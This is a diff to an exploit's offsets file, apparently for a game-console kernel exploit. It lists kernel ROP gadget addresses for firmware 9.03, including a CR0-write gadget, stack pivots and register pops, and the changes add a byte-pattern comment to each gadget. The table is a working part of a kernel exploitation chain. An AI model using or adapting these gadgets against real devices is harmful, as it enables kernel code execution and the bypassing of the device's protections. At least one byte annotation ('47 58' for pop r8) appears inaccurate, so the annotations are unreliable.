@@ -110,84 +110,84 @@ class OffsetsFirmware_903:
 
     MEMCPY = 0xffffffff824714b0
 
-    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff823fb949
+    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff823fb949 #0F 22 C6 48 F7 C6
 
     SECOND_GADGET_OFF = 0x3d
 
     # 0xffffffff82996603 : jmp qword ptr [rsi + 0x3d]
-    FIRST_GADGET = 0xffffffff82996603
+    FIRST_GADGET = 0xffffffff82996603 #FF 66 3D 
 
     # 0xffffffff82c76646 : push rbp ; jmp qword ptr [rsi]
-    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c76646
+    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c76646 #55 FF  26
 
     # 0xffffffff822b4151 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
-    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff822b4151
+    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff822b4151 #5B 41 5E 5D FF 66 10
 
     # 0xffffffff82941e46 : lea rsp, [rsi + 0x20] ; repz ret
-    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff82941e46
+    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff82941e46 #48 8D  66 20 F3 C3
 
     # 0xffffffff826c52aa : add rsp, 0x28 ; pop rbp ; ret
-    ADD_RSP_28_POP_RBP_RET = 0xffffffff826c52aa
+    ADD_RSP_28_POP_RBP_RET = 0xffffffff826c52aa #48 83 C4 28 5D C3
 
     # 0xffffffff8251b08f : add rsp, 0xb0 ; pop rbp ; ret
-    ADD_RSP_B0_POP_RBP_RET = 0xffffffff8251b08f
+    ADD_RSP_B0_POP_RBP_RET = 0xffffffff8251b08f #48 81 C4 B0 00 00 00 5D C3
 
     # 0xffffffff822008e0 : ret
-    RET = 0xffffffff822008e0
+    RET = 0xffffffff822008e0 #C3
 
     # 0xffffffff822391a8 : pop rdi ; ret
-    POP_RDI_RET = 0xffffffff822391a8
+    POP_RDI_RET = 0xffffffff822391a8 #5F C3
 
     # 0xffffffff822aad39 : pop rsi ; ret
-    POP_RSI_RET = 0xffffffff822aad39
+    POP_RSI_RET = 0xffffffff822aad39 #5E C3
 
     # 0xffffffff82322eba : pop rdx ; ret
-    POP_RDX_RET = 0xffffffff82322eba
+    POP_RDX_RET = 0xffffffff82322eba #5A C3
 
     # 0xffffffff822445e7 : pop rcx ; ret
-    POP_RCX_RET = 0xffffffff822445e7
+    POP_RCX_RET = 0xffffffff822445e7#59  C3
 
     # 0xffffffff822ab4dd : pop r8 ; pop rbp ; ret
-    POP_R8_POP_RBP_RET = 0xffffffff822ab4dd
+    POP_R8_POP_RBP_RET = 0xffffffff822ab4dd #47 58 5D C3
 
     # 0xffffffff8279fa0f : pop r12 ; ret
-    POP_R12_RET = 0xffffffff8279fa0f
+    POP_R12_RET = 0xffffffff8279fa0f #41 5C C3
 
     # 0xffffffff82234ec8 : pop rax ; ret
-    POP_RAX_RET = 0xffffffff82234ec8
+    POP_RAX_RET = 0xffffffff82234ec8 #58 C3
 
     # 0xffffffff822008df : pop rbp ; ret
-    POP_RBP_RET = 0xffffffff822008df
+    POP_RBP_RET = 0xffffffff822008df#5D C3
 
     # 0xffffffff82bb687a : push rsp ; pop rsi ; ret
-    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb687a
+    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb687a #54 5E C3
 
     # 0xffffffff82244ed0 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
-    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff82244ed0
+    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff82244ed0 #48 8B 3F 5D FF E0
 
     # 0xffffffff82b7450e : mov byte ptr [rcx], al ; ret
-    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff82b7450e
+    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff82b7450e #88 01 C3
 
     # 0xffffffff82632b9c : mov rdi, rbx ; call r12
-    MOV_RDI_RBX_CALL_R12 = 0xffffffff82632b9c
+    MOV_RDI_RBX_CALL_R12 = 0xffffffff82632b9c #48 89 DF 41 FF D4
 
     # 0xffffffff8235b387 : mov rdi, r14 ; call r12
-    MOV_RDI_R14_CALL_R12 = 0xffffffff8235b387
+    MOV_RDI_R14_CALL_R12 = 0xffffffff8235b387 #4C  89 F7 41 FF D4
 
     # 0xffffffff822e3d7e : mov rsi, rbx ; call rax
-    MOV_RSI_RBX_CALL_RAX = 0xffffffff822e3d7e
+    MOV_RSI_RBX_CALL_RAX = 0xffffffff822e3d7e #48 89 DE FF D0
 
     # 0xffffffff82363918 : mov r14, rax ; call r8
-    MOV_R14_RAX_CALL_R8 = 0xffffffff82363918
+    MOV_R14_RAX_CALL_R8 = 0xffffffff82363918 # 49 89 C6 41 FF D0
 
     # 0xffffffff82cb683a : add rdi, rcx ; ret
-    ADD_RDI_RCX_RET = 0xffffffff82cb683a
+    ADD_RDI_RCX_RET = 0xffffffff82cb683a #48 03 F9 C3
 
     # 0xffffffff82409557 : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
-    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff82409557
+    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff82409557 #48  29 D6 48 89 F0 5D C3
 
     # 0xffffffff82b85693 : jmp r14
-    JMP_R14 = 0xffffffff82b85693
+    JMP_R14 = 0xffffffff82b85693 #49 FF E6
 
 # FW 11.00
 class OffsetsFirmware_1100:
